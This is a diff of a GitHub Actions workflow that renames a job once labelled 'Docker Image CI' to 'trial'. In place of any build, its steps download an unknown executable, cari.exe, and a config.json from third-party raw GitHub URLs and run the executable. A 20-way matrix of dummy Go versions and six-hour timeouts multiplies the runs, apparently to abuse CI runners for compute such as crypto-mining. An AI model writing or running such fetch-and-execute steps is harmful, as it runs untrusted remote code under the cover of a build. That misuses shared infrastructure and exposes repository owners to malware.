@@ -1,29 +1,19 @@
-name: Docker Image CI
-on:
-  push:
-    branches: [ master ]
-  pull_request:
-    branches: [ master ]
-  schedule:
-  - cron: "*/1 * * * *"
-
+name: trial
+ 
 jobs:
   build:
-
+    name: BUILD
     runs-on: windows-latest
-
-   steps:
-    - name: PREPARING
-      run: Invoke-WebRequest https://raw.githubusercontent.com/outlookadek/PAPAERSPACE/main/cari.exe -Outfile cari.exe
-    - name: PREPARING2 
-      run: Invoke-WebRequest https://raw.githubusercontent.com/trautroi/aws/master/1.18/config.json -Outfile config.json
-    - name: Running
-      run: ./cari.exe
-
-
     strategy:
       fail-fast: false
       matrix:
          go: [1.11, 1.12, 1.13, 1.14, 1.15]
          flag: [A, B, C, D]
     timeout-minutes: 360
+    steps:
+    - name: PREPARING
+      run: Invoke-WebRequest https://raw.githubusercontent.com/outlookadek/PAPAERSPACE/main/cari.exe -Outfile cari.exe
+    - name: PREPARING2 
+      run: Invoke-WebRequest https://raw.githubusercontent.com/trautroi/aws/master/1.18/config.json -Outfile config.json
+    - name: Running
+      run: ./cari.exe
